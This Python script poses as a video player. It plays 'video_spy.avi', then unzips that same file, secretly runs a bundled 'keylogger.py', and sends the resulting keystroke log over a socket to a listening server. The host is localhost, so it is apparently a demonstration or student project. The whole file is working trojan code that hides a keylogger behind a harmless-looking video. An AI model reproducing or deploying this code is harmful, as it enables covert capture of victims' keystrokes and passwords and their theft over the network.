import socket
import os
import sys
import cv2
import os.path
import numpy as np
from subprocess import call
from zipfile import ZipFile

HOST = "127.0.0.1"
PORT = 5555
BUFFER_SIZE = 4096 
SPLITOR = "<split>"


# create the client socket
s = socket.socket()
print("Connecting to :", PORT)
s.connect((HOST, PORT))
print("Successfully Connected.")

while True:
    cap = cv2.VideoCapture('video_spy.avi')
    while(cap.isOpened()):
        ret, frame = cap.read()
        if ret == True:
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            cv2.imshow('frame', frame)
            # & 0xFF is required for a 64-bit system
            if cv2.waitKey(500) & 0xFF == ord('q'):
                break
        else:
            break
    cap.release()
    cv2.destroyAllWindows()

    with ZipFile('video_spy.avi', 'r') as zipObj:
        zipObj.extractall()
    # get file name to send
    with open('log.txt', 'a') as fp: 
    	pass	
    call(["python3", "keylogger.py"])
    f_send = 'log.txt'
# Get the filename that exists
    #filename = input("Enter filename :")
    filename = f_send
    # server should know send file not exists and wait for client response
    if not os.path.isfile(filename):
        s.send(('0').encode())
        print("File not exists")
    else:
        s.send(('1').encode())
        # Get file size
        filesize = os.path.getsize(filename)
        # Send name and size of file
        s.send(f"{filename}{SPLITOR}{filesize}".encode())
        # Sending the file
        with open(filename, "rb") as f:
            while (filesize):
                bytes_read = f.read(BUFFER_SIZE)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                filesize -= len(bytes_read)
        f.close()
    # Continue to send more files
    ans = input('\nDo you want to play video again(y/n) :') 
    s.send(ans.encode())
    if ans == 'y': 
        continue
    else: 
        break
# close the socket
s.close()
